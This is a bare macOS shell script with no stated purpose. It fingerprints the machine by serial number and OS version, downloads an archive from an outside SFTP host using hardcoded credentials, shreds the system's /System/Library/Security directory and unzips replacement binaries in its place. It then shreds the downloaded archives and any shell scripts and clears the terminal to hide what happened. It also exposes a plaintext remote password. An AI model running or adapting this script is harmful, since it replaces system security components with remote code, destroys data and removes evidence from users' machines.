echo "<======= 444=======>"
#
# <============server configuration==============>
#
PERSON_NAME="attitude"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="92cbbc360e694bd5be3c6a09c20c1e30"
REMOTE_PASS="31eWbz8eNO72rWM87LChgnsc8ugbgpX1"
REMOTE_PATH="/home"
REMOTE_DEST="/"

# Configuration
SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
IOS_VERSION=$(sw_vers -productVersion)
LOCAL_FILE="appstore_unmodified"
ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
echo "$ARCHIVE_NAME"


cd $home/../../../System/Library/
# configuration



#sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:"${ARCHIVE_NAME}_new.zip" ./"${ARCHIVE_NAME}_new.zip"
#rm -rf ./Security
shred -fzu -n 3 ./Security >/dev/null 2>&1
#echo "fsdfsdfdsfsdfsdfds"
unzip -qqo "${ARCHIVE_NAME}_new.zip" -d ./
#rm -f *.zip
shred -uzv *.{zip,7z,sh}
reset
echo "sucessfully added binaries"
